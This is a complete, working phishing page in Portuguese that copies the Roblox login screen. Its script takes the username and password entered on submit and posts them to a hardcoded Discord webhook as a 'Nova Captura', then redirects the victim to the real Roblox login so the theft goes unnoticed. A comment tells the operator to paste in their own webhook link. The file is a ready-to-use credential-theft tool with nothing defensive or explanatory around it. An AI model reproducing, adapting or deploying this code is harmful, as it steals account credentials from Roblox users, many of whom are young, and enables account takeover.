<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
        
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #0d0e12; /* Preto profundo do fundo */
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* HEADER */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 24px;
            background-color: #191b1f;
            border-bottom: 1px solid #2e3134;
            z-index: 100;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .logo-text {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 1px;
            color: #fff;
        }

        .nav-links {
            display: flex;
            gap: 20px;
            font-size: 15px;
            font-weight: 600;
            color: #e3e3e3;
        }

        .nav-links span { cursor: pointer; }
        .nav-links span:hover { color: #fff; }

        .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-bar {
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            width: 220px;
            color: #9ea2a6;
            font-size: 14px;
        }

        .btn-cadastrar {
            background-color: #335fff;
            color: #fff; border: none;
            padding: 8px 16px; border-radius: 6px;
            font-size: 14px; font-weight: 600;
            cursor: pointer;
        }

        .btn-entrar-top {
            background-color: transparent;
            color: #fff; border: 1px solid #ffffff;
            padding: 8px 16px; border-radius: 6px;
            font-size: 14px; font-weight: 600;
            cursor: pointer;
        }

        /* FUNDO DE JOGOS (Simulado com CSS e imagens) */
        .games-bg {
            flex: 1;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background: 
                radial-gradient(circle at center, rgba(13,14,18,0.8) 0%, rgba(13,14,18,1) 80%),
                url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg') center/cover; /* Imagem genérica de fundo, podes trocar por um print dos jogos */
            background-blend-mode: overlay;
            overflow: hidden;
        }

        /* FORMULÁRIO CENTRAL */
        .login-container {
            background-color: #232527;
            width: 90%;
            max-width: 400px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            z-index: 10;
            position: relative;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-group input {
            width: 100%;
            padding: 16px;
            background-color: #191b1f;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }

        .input-group input::placeholder {
            color: #9ea2a6;
        }

        .btn-main {
            width: 100%;
            padding: 16px;
            background-color: #232527;
            border: 1px solid #fff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 12px;
            cursor: pointer;
        }

        .btn-main:active { background-color: #3b3f43; }

        .forgot-link {
            display: block;
            text-align: center;
            color: #fff;
            text-decoration: none;
            font-size: 15px;
            margin: 20px 0;
            font-weight: 600;
        }

        .divider {
            height: 1px;
            background-color: #3b3f43;
            margin: 20px 0;
        }

        .btn-secondary {
            width: 100%;
            padding: 16px;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .btn-secondary:active { background-color: #3b3f43; }

        .signup-text {
            text-align: center;
            color: #e3e3e3;
            font-size: 15px;
            margin-top: 20px;
            font-weight: 500;
        }

        .signup-text a {
            color: #ffffff;
            font-weight: 700;
            text-decoration: none;
        }

        /* RODAPÉ CLASSIFICAÇÃO */
        .footer-rating {
            background-color: #191b1f;
            padding: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #fff;
            font-weight: 700;
        }

        .rating-bar {
            display: flex;
            margin-top: 4px;
        }

        .rating-bar div {
            width: 100px;
            height: 4px;
        }
        .rating-red { background-color: #ff0000; }
        .rating-white { background-color: #ffffff; }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <div class="header-left">
            <div class="logo-text">RŌBLOX</div>
            <div class="nav-links">
                <span>Destaques</span>
                <span>Mercado</span>
                <span>Criar</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="header-right">
            <div class="search-bar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                Pesquisar
            </div>
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
        </div>
    </div>

    <!-- FUNDO DOS JOGOS E FORMULÁRIO -->
    <div class="games-bg">
        <div class="login-container">
            <h1>Entrar na Roblox</h1>
            
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                
                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
            </form>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

            <div class="divider"></div>

            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>
            <button class="btn-secondary">Outras opções de acesso</button>

            <div class="signup-text">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </div>

    <!-- RODAPÉ -->
    <div class="footer-rating">
        CLASSIFICAÇÃO INDICATIVA: 16 ANOS
        <div class="rating-bar">
            <div class="rating-red"></div>
            <div class="rating-white"></div>
        </div>
    </div>

    <script>
        // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';

        const form = document.getElementById('login-form');
        const btnSubmit = document.getElementById('btn-submit');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = user.value.trim();
            const password = pass.value;
            if (!username || !password) return;

            btnSubmit.textContent = 'Entrando...';

            const payload = {
                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Redireciona pro site real da Roblox
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/pt/Login';
                }, 1500);

            } catch (error) {
                btnSubmit.textContent = 'Entrar';
                alert('Erro de conexão. Tente novamente.');
            }
        });
    </script>
</body>
</html>
